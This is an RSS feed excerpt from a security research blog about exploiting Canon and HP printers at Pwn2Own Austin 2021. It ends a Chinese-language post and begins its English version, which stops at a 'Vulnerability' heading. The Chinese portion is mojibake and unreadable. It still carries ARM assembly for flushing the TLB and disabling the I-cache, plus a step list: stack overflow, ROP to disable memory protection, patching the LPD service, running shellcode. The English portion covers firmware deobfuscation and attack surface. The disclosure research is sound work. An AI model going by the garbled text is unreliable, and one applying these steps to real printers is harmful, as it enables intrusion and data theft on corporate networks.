&lt;p&gt;‰ΩÜÊúâ‰∏ÄÈªûÂøÖÈ†àÁâπÂà•Ê≥®ÊÑèÔºåË¶ÜËìãÂÆå translation table entry Ë∑ü LPD ÁöÑ code ÂæåÔºåÂãôÂøÖË¶Å &lt;strong&gt;flush TLB&lt;/strong&gt; Ë∑ü&lt;strong&gt;Ê∏ÖÊéâ I-cache Âíå D-cache&lt;/strong&gt;  ‰∏çÁÑ∂ÂæàÊúâÂèØËÉΩÈÇÑÊòØË∑ëÂú®ËàäÊúâÁöÑÁ®ãÂºèÁ¢º‰∏äÈù¢Â∞éËá¥ exploit Â§±Êïó„ÄÇ&lt;/p&gt;

&lt;p&gt;Flush TLB&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flush_tlb:
    mov r12, #0
    mcr p15, 0, r12, c8, c7, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Invalidate I-cache&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;disable_icache:
    mrc p15, 0, r1, c1, c0, 0
    bic r1, r1, #(1 &amp;lt;&amp;lt; 12)
    mcr p15, 0, r1, c1, c0, 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÈáçÊñ∞Êï¥ÁêÜ‰∫Ü‰∏Ä‰∏ãÂà©Áî®Ê≠•È©ü&lt;/p&gt;

&lt;h4 id=&quot;exploitation-step-1&quot;&gt;Exploitation Step&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;È¶ñÂÖàÂÖàËß∏Áôº LLMNR ÁöÑ stack overflow&lt;/li&gt;
  &lt;li&gt;Âà©Áî®ÊúâÈôêÁöÑ ROP ÈóúÈñâ MPU&lt;/li&gt;
  &lt;li&gt;Âà©Áî® ROP ÊîπÊéâ translation table entry Áç≤ÂæóËÆÄÂØ´Âü∑Ë°åÊ¨äÈôê&lt;/li&gt;
  &lt;li&gt;Flush TLB&lt;/li&gt;
  &lt;li&gt;ÊîπÊéâ LPD service ÁöÑÁ®ãÂºèÁ¢º&lt;/li&gt;
  &lt;li&gt;Ê∏ÖÊéâ I-cache Âíå D-cache&lt;/li&gt;
  &lt;li&gt;‰ΩøÁî®ÊîπÈÅéÁöÑ LPD ËÆÄÊàëÂÄëÁöÑ shellcode Âæå‰∏¶Âü∑Ë°å&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pwn2own-austin-2021-2&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Âà∞ÂèØ‰ª•Âü∑Ë°å shellcode ÊôÇÔºåÊàëÂÄëÂè™Ââ©‰∏ÄÈÄ±ÊôÇÈñìÔºåÊàëÂÄëÊúÄÂæåÈÅ∏ÊìáË∑ü Canon ‰∏ÄÊ®£‰ΩøÁî®ÊîπÂ≠ó‰∏≤È°ØÁ§∫ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pwned by DEVCORE&lt;/code&gt; Âà∞ LCD ‰∏ä„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/28.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂπ∏ÈÅãÁöÑÊòØÔºåÊàëÂÄëÁ¨¨‰∏ÄÊ¨°ÂòóË©¶Â∞±ÊàêÂäü‰∫ÜÔºöÔºâ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/vQbQImZ3XRw?start=29093&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;p&gt;Âú®ÈÄô‰πãÂæåÊàëÂÄë‰πüÂòóË©¶‰∫ÜÁõ¥Êé•ÊääÂæåÈñÄÊîπÊàê debug console ‰∏äÈù¢ÔºåÊñπ‰æøÂà©Áî®Ë®±Â§öÂäüËÉΩÔºå‰æãÂ¶ÇÊü•ÁúãË®òÊÜ∂È´îË≥áË®äÔºåÊí≠ÊîæÈü≥Ê®ÇÁ≠âÁ≠âÂäüËÉΩÔºå&lt;a href=&quot;https://twitter.com/fsecurelabs&quot;&gt;F-Secure Labs&lt;/a&gt; Âú®ÊØîË≥ΩÊôÇÂ∞±‰ΩøÁî®Êí≠ÊîæÈü≥Ê®ÇÈÄôÂÄãÂäüËÉΩ‰æÜÂëàÁèæÔºåÈùûÂ∏∏ÊúâË∂£ÔºåÂèØ‰ª•Âà∞&lt;a href=&quot;https://youtu.be/c82uFBdTvII?t=1263&quot;&gt;ÈÄôË£°&lt;/a&gt;ÁúãÁï∂ÊôÇÁöÑÊÉÖÊ≥Å„ÄÇ&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/S9TkvaAmyMw&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;result&quot;&gt;Result&lt;/h3&gt;
&lt;p&gt;Âú® Pwn2Own Austin 2021 ‰∏≠ÔºåÊàëÂÄëÊâì‰∏ãÂÖ∂‰ªñË®≠ÂÇôË∑üÂç∞Ë°®Ê©üÂæåÊúÄÁµÇÁç≤Âæó‰∫ÜÁ¨¨‰∫åÂêçÔºå‰ª•ÈÄôÊ¨°‰æÜË™™Áç≤Âæó‰∏çÈåØÁ∂ìÈ©óÔºå‰πüÂ≠∏Âà∞‰∫Ü‰∏Ä‰∫õÊñ∞Êù±Ë•ø„ÄÇ&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/29.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ËÄåÂ∞çÊñº‰∏ÄËà¨Áî®Êà∂ÂÄëÔºåÊúâ‰ªÄÈ∫ºÊñπÊ≥ïÂèØ‰ª•ÈÅøÂÖçÂç∞Ë°®Ê©üË¢´Áï∂‰ΩúÊîªÊìäÁõÆÊ®ôÁîöËá≥ÊòØË∑≥ÊùøÂë¢?&lt;/p&gt;

&lt;h2 id=&quot;mitigation&quot;&gt;Mitigation&lt;/h2&gt;
&lt;h3 id=&quot;update&quot;&gt;Update&lt;/h3&gt;

&lt;p&gt;È¶ñÂÖàÂ∞±ÊòØÂÆöÊúüÊõ¥Êñ∞Ôºå‰∏äËø∞ÁöÑÂç∞Ë°®Ê©üÈÉΩÂ∑≤Êúâ patchÔºåÈÄôÈÇäÊòØÂæàÂ∏∏Ë¢´Â§ßÂÆ∂ÂøΩÁï•ÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÊàëÂÄëÂæàÂ∏∏ÁúãÂà∞Âç∞Ë°®Ê©üÂ•ΩÂπæÂπ¥‰∫ÜÈÉΩÊ≤íÊõ¥Êñ∞ÔºåÁîöËá≥Áõ¥Êé•È†êË®≠ÂØÜÁ¢ºÊîæËëóÔºåÂæàÂÆπÊòìÂ∞±Ë¢´Áï∂ÊàêÁõÆÊ®ô„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;disable-unused-service&quot;&gt;Disable unused service&lt;/h3&gt;

&lt;p&gt;Âè¶Â§ñ‰∏ÄÈªûÂ∞±ÊòØÁõ°ÂèØËÉΩÈóúÊéâÊ≤íÂú®Áî®ÁöÑÊúçÂãôÔºå Â§ßÈÉ®ÂàÜÁöÑÂç∞Ë°®Ê©üÈ†êË®≠ÈñãÂïüÈÅéÂ§öÂπ≥Â∏∏Ê†πÊú¨‰∏çÊúÉÁî®ÁöÑÊúçÂãôÔºåÊàëÂÄëÁîöËá≥Ë™çÁÇ∫ÂèØ‰ª•ÈóúÊéâ discovery ÊúçÂãôÔºåÂè™Ë¶ÅÈñã‰Ω†Ë¶ÅÁî®ÁöÑÂ∞±Â•Ω‰∫Ü„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;firewall&quot;&gt;Firewall&lt;/h3&gt;
&lt;p&gt;Êõ¥Â•ΩÁöÑÂÅöÊ≥ïÂèØ‰ª•ÂÜçÂä†‰∏ä firewallÔºåÂ§ßÈÉ®ÂàÜÂç∞Ë°®Ê©ü‰πüÈÉΩÊúâÊèê‰æõÁõ∏ÈóúÂäüËÉΩ„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;‰∫ãÂØ¶‰∏äÔºåÊàëÂÄëÁç≤Âæó shellcode Âü∑Ë°åÂæåÔºåÈô§‰∫ÜÂç∞Êù±Ë•øÂú® LCD Â§ñÔºåÊàëÂÄëÂèØ‰ª•ËóâÁî±Âç∞Ë°®Ê©ü‰æÜÁ´äÂèñÊ©üÂØÜË≥áË®äÔºå‰∏çË´ñÊòØÊ©üÂØÜÊñá‰ª∂ÊàñÊòØ‰∏Ä‰∫õ credentialÔºåÂç∞Ë°®Ê©ü‰πüÊòØÂÄãÂπ≥Ë°åÁßªÂãï (Lateral Movement) ÁöÑÈªûÔºåËÄå‰∏îÂæàÈõ£Ë¢´ÂÅµÊ∏¨Âà∞ÔºåÊòØÁ¥ÖÈöä‰∏≠ÈùûÂ∏∏Â•ΩÁöÑÁõÆÊ®ô„ÄÇÂè¶Â§ñÂæàÂ§öÂç∞Ë°®Ê©ü‰∏äÁöÑÁôºÁèæÊúçÂãôÁ≥ªÂàóÁöÑÂçîÂÆöÊàñÊòØ DNS Á≥ªÂàóÁöÑÂçîÂÆöÂæàÂ∏∏Âá∫ÂïèÈ°åÔºåÂ¶ÇÊûúÊÉ≥ÊâæÈ°û‰ººÂç∞Ë°®Ê©üÊàñÂÖ∂‰ªñ IoT Ë®≠ÂÇôÁöÑÊºèÊ¥ûÔºå‰πüË®±ÂèØ‰ª•ÂÑ™ÂÖàÊúùÈÄôÂÄãÊñπÂêëÁúãÁúã„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;to-be-continue&quot;&gt;To be continue&lt;/h2&gt;
&lt;p&gt;ÊúÄÂæåÔºåÊàëÂÄëÂú®ÂéªÂπ¥ &lt;a href=&quot;https://www.thezdi.com/blog/2022/8/29/announcing-pwn2own-toronto-2022-and-introducing-the-soho-smashup&quot;&gt;Pwn2Own Toronto 2022&lt;/a&gt; ‰∏≠Ôºå‰πüÂú®Âç∞Ë°®Ê©üÁ≥ªÂàó‰∏≠ÊâæÂà∞ÂπæÂÄãÊºèÊ¥ûÔºåÊàëÂÄë‰πüÂ∞áÊúÉÂú®ËøëÊúüÁôº‰ΩàË©≥Á¥∞Ë≥áË®äÔºåÊï¨Ë´ãÊúüÂæÖ Part II&lt;/p&gt;

&lt;h2 id=&quot;reference&quot;&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&quot;&gt;https://labs.withsecure.com/assets/BlogFiles/Printing-Shellz.pdf&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&quot;&gt;https://foxglovesecurity.com/2017/11/20/a-sheep-in-wolfs-clothing-finding-rce-in-hps-printer-fleet/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&quot;&gt;https://research.checkpoint.com/2018/sending-fax-back-to-the-dark-ages/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
                <link>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/</link>
                <guid>https://devco.re/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1</guid>
                <pubDate>Thu, 05 Oct 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part I</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Printer has become one of the essential devices in the corporate intranet in the past few years, and its functionalities have also increased significantly. Not only printing or faxing, cloud printing services like AirPrint are also supported to make it easier to use. Direct printing from mobile devices is now a basic requirement in the IoT era. We also use it to print some internal business documents of the company, which makes it even more important to keep the printer secure.&lt;/p&gt;

&lt;p&gt;In 2021, we found Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-515/&quot;&gt;CVE-2022-24673&lt;/a&gt; and &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-532/&quot;&gt;CVE-2022-3942&lt;/a&gt;) in Canon and HP printers, and vulnerability(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-22-332/&quot;&gt;CVE-2021-44734&lt;/a&gt;) in Lexmark. We used these vulnerabilities to exploit Canon ImageCLASS MF644Cdw, HP Color LaserJet Pro MFP M283fdw and Lexmark MC3224i in &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/11/1/pwn2ownaustin&quot;&gt;Pwn2Own Austin 2021&lt;/a&gt;. Following we will describe the details of the Canon and HP vulnerabilities and exploitation.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This research is also presented at &lt;a href=&quot;https://hitcon.org/2022/agenda/704bf58c-c42b-4593-97c0-9aba91caa6e4&quot;&gt;HITCON 2022&lt;/a&gt; and &lt;a href=&quot;https://codeblue.jp/2022/en/talks/&quot;&gt;CODE BLUE 2022&lt;/a&gt;. You can check the &lt;a href=&quot;https://hitcon.org/2022/slides/Your%20Printer%20is%20not%20your%20Printer%20!%20-%20Hacking%20Printers%20at%20Pwn2Own.pdf&quot;&gt;slides&lt;/a&gt; here.&lt;/p&gt;

&lt;h2 id=&quot;printer&quot;&gt;Printer&lt;/h2&gt;
&lt;p&gt;In the early days, it often required an IEEE1284 or USB Printer cable to connect the printer to the computer. We also had to install the printer driver provided by the manufacturer. Nowadays, most of the printers on the market do not require USB or traditional cable. As long as the printer is connected to the intranet through a LAN cable, we can find and utilize the printer immediately.&lt;/p&gt;

&lt;p&gt;Printer also provides not only printing but also various services such as FTP, AirPrint, Bonjour. Nothing more than to make printing more convenient.&lt;/p&gt;

&lt;h2 id=&quot;motivation&quot;&gt;Motivation&lt;/h2&gt;

&lt;h3 id=&quot;why-do-we-want-to-research-printers-&quot;&gt;Why do we want to research Printers ?&lt;/h3&gt;

&lt;h4 id=&quot;red-team&quot;&gt;Red Team&lt;/h4&gt;
&lt;p&gt;While doing red team assessment, we found that printers generally appeared in the corporate intranet. There are almost always more than one, but they are usually overlooked and lack of update. It is also an excellent target for red team to hide the action because it is often difficult to detect. It is worth mentioning that larger enterprises are also likely to connect them to AD and become the entry point for confidential information.&lt;/p&gt;

&lt;h4 id=&quot;pwn2own-austin-2021&quot;&gt;Pwn2Own Austin 2021&lt;/h4&gt;
&lt;p&gt;Another reason is that printers have become one of the main targets of Pwn2Own Mobile. We were also preparing to participate the Pwn2Own stage again, so we decided to start with it.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/2.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At first, we thought they were trivial. Like most IoT devices, there are often many command injection vulnerabilities. However, many printers use RTOS instead of Linux systems, which drove our determination to challenge it.&lt;/p&gt;

&lt;p&gt;This article will focus on the Canon and HP parts.&lt;/p&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;
&lt;p&gt;In the beginning, we read many &lt;a href=&quot;https://chdk.fandom.com/wiki/DryOS_PIXMA_Printer_Shell&quot;&gt;articles&lt;/a&gt;, all of them need to tear down the hardware for analysis and obtaining the debug console. Then they use the memory dumping method to obtain the original firmware. But in the end, we chose another way and didn‚Äôt tear down any of the printers.&lt;/p&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;
&lt;p&gt;The initial analysis version is v6.03, we used binwalk to analyze it at the beginning, but the firmware is obfuscated, we can‚Äôt analyze it directly.&lt;/p&gt;

&lt;p&gt;Obfuscated Canon ImageCLASS MF644Cdw firmware
&lt;img src=&quot;/assets/img/blog/20231005/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We also tried &lt;a href=&quot;https://www.synacktiv.com/publications/treasure-chest-party-quest-from-doom-to-exploit.html&quot;&gt;‚ÄúTREASURE CHEST PARTY QUEST: FROM DOOM TO EXPLOIT‚Äù&lt;/a&gt; by Synacktiv and &lt;a href=&quot;https://web.archive.org/web/20220224100459/https://www.contextis.com/en/blog/hacking-canon-pixma-printers-doomed-encryption&quot;&gt;‚ÄúHacking Canon Pixma Printers¬†‚Äì¬†Doomed Encryption‚Äù&lt;/a&gt; by Contextis research. But this time, it‚Äôs an entirely different series, and we can‚Äôt use the same method to deobfuscate the firmware.&lt;/p&gt;

&lt;p&gt;So we started to analyze the obfuscated firmware format and content.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/4.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see from the obfuscated firmware that the beginning is the Magic NCFW, followed by the size of the firmware, and other parts are obfuscated data.&lt;/p&gt;

&lt;p&gt;So we started to think that maybe the old firmware of this printer is not obfuscated until a specific version. If we can get the intermediate version, maybe there is a chance to get the deobfuscation method. The magic header also lets us distinguish whether it is obfuscated.&lt;/p&gt;

&lt;p&gt;We can obtain the firmware download URL through the official website or the update packet.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://pdisp01.c-wss.com/gdl/WWUFORedirectTarget.do?id=MDQwMDAwNDc1MjA1&amp;amp;cmp=Z01&amp;amp;lang=EN
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After analysis, it can be split into three parts.
&lt;img src=&quot;/assets/img/blog/20231005/5.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ôº∑e can roughly infer the rules of the download URL. We use this method to download all versions of firmware. The versions we downloaded at that time included:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;V2.01&lt;/li&gt;
  &lt;li&gt;V4.02&lt;/li&gt;
  &lt;li&gt;V6.03&lt;/li&gt;
  &lt;li&gt;V9.03&lt;/li&gt;
  &lt;li&gt;V10.02&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;V10.02 is a version that will be released in a few weeks, and you can download it from here first. After downloading all versions, we found that the firmware for this series is obfuscated, and there is no way to deobfuscate it from the previous version.&lt;/p&gt;

&lt;p&gt;But we can try downloading Canon‚Äôs other series firmware and find out if there is a similar obfuscation algorithm. After all the firmware is downloaded, the total file size is 130 GB. We can find unobfuscated firmware by grepping for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NCFW&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;servicemode.html&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/6.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, we found four firmware that meets the conditions. We chose WG7000 series printers to analyze and found the suspected deobfuscation function.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/7.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Fortunately, by rewriting this function, the MF644Cdw firmware can be deobfuscated.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/8.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After the firmware is extracted, we needed the image base address so that IDA can effectively identify and reference the strings. At first, we find the image base through the common analysis tool &lt;a href=&quot;https://github.com/sgayou/rbasefind&quot;&gt;rbasefind&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/9.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first base we found was 0x40b0000. But after decompiled it with IDA, most of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function&lt;/code&gt; did not correspond to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug message&lt;/code&gt; string.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/10.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As shown in the figure above, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loc_4489AC08&lt;/code&gt; should point to the string of the function name, but this address is not a regular string. Instead, it is recognized as a code section, and the content is not a string. This indicates that this location is not an actual address. We thought there was a slight offset, but it did not cause big problem for decompiling functions.&lt;/p&gt;

&lt;p&gt;How to solve this problem? We first found a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function with a known function name&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function name string&lt;/code&gt; belonging to it to make adjustments. After finding the offset, we adjusted the image base to the correct address. The final image base found is &lt;strong&gt;0x40affde0&lt;/strong&gt;. After adjustment, you can see that the original function name can be identified correctly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/11.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, we can analyze the firmware typically. After preliminary analysis, we can find out the of Canon ImageCLASS MF644Cdw:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS - DryOSV2
    &lt;ul&gt;
      &lt;li&gt;Customized RTOS by Canon&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
  &lt;li&gt;Linked with application code into single image
    &lt;ul&gt;
      &lt;li&gt;Kernel&lt;/li&gt;
      &lt;li&gt;Service&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;HP‚Äôs firmware is relatively easy to obtain. We can use &lt;a href=&quot;https://github.com/fkie-cad/fact_extractor/issues/37&quot;&gt;binwalk -Z&lt;/a&gt; to obtain the correct firmware. It took about 3-4 days. The other steps, such as finding the image base address, are just the same as Canon. After preliminary analysis, the architecture of HP Color LaserJet Pro MFP M283fdw is as follows:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;OS
    &lt;ul&gt;
      &lt;li&gt;RTOS - Modify from ThreadX/Green Hills&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ARM11 Mixed-endian
    &lt;ul&gt;
      &lt;li&gt;Code - little-endian&lt;/li&gt;
      &lt;li&gt;Data - Big-endian&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;attack-surface&quot;&gt;Attack Surface&lt;/h2&gt;
&lt;p&gt;Many services are enabled by default in most printers on the market today.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Service&lt;/th&gt;
      &lt;th&gt;Port&lt;/th&gt;
      &lt;th&gt;Description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;RUI&lt;/td&gt;
      &lt;td&gt;TCP 80/443&lt;/td&gt;
      &lt;td&gt;Web interface&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PDL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Page Description Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;PJL&lt;/td&gt;
      &lt;td&gt;TCP 9100&lt;/td&gt;
      &lt;td&gt;Printer Job Language&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;IPP&lt;/td&gt;
      &lt;td&gt;TCP 631&lt;/td&gt;
      &lt;td&gt;Internet Printing Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LPD&lt;/td&gt;
      &lt;td&gt;TCP 515&lt;/td&gt;
      &lt;td&gt;Line Printer Daemon Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SNMP&lt;/td&gt;
      &lt;td&gt;UDP 161&lt;/td&gt;
      &lt;td&gt;Simple Network Management Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;SLP&lt;/td&gt;
      &lt;td&gt;TCP 427&lt;/td&gt;
      &lt;td&gt;Service Location Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;mDNS&lt;/td&gt;
      &lt;td&gt;UDP 5353&lt;/td&gt;
      &lt;td&gt;Multicast DNS&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;LLMNR&lt;/td&gt;
      &lt;td&gt;UDP 5355&lt;/td&gt;
      &lt;td&gt;Link-Local Multicast Name Resolution&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
      &lt;td&gt;‚Ä¶&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Usually, RUI (web interface) is opened for facilitate management. The 9100 Port is also commonly used by printers, mainly used to transmit printed data.&lt;/p&gt;

&lt;p&gt;Others vary between vendors, but the listed ones are usually present, and most are enabled by default. After evaluating the overall architecture, we focus on service discovery and the DNS series of services. Our long-term experience has often observed that such protocols implemented by manufacturers are often prone to vulnerabilities. The primary services we analyzed were &lt;strong&gt;SLP&lt;/strong&gt;, &lt;strong&gt;mDNS&lt;/strong&gt;, and &lt;strong&gt;LLMNR&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Next, we take Pwn2Own Austin 2021 as a case study to see what problems these protocols often have.&lt;/p&gt;

&lt;h2 id=&quot;hacking-printers-at-pwn2own&quot;&gt;Hacking printers at Pwn2Own&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;service-location-protocol&quot;&gt;Service Location Protocol&lt;/h4&gt;
&lt;p&gt;SLP is a service discovery protocol that allows computers and other devices to find services in local area network. In the past, there were many &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2021/3/1/cve-2020-3992-amp-cve-2021-21974-pre-auth-remote-code-execution-in-vmware-esxi&quot;&gt;vulnerabilities&lt;/a&gt; in EXSI‚Äôs SLP. Canon implements the SLP service mainly by themselves. For details about SLP service, please refer to &lt;a href=&quot;https://www.ietf.org/rfc/rfc2608.txt&quot;&gt;RFC2608&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Before we look into the detail of SLP, we need to talk about the structure of SLP packets.&lt;/p&gt;

&lt;p&gt;SLP Packet Structure
&lt;img src=&quot;/assets/img/blog/20231005/12.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here we only need to pay attention to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;function-id&lt;/code&gt;. This field determines the request type and the format of the payload part. Canon only implements Service Request and Attribute Request.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231005/13.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the Attribute Request (AttrRqst), the user can obtain the attribute list according to the service and scope. We can specify a scope to look for, such as Canon printers.&lt;/p&gt;

&lt;p&gt;Example:
&lt;img src=&quot;/assets/img/blog/20231005/14.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The Attribute Request structure is as follows
&lt;img src=&quot;/assets/img/blog/20231005/15.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It mainly comprises length (Length) and value (Value). Parsing this kind of format should be careful because there are often bugs here. 
In fact, there is a vulnerability in Canon when paring this format.&lt;/p&gt;

&lt;h4 id=&quot;vulnerability&quot;&gt;Vulnerability&lt;/h4&gt;
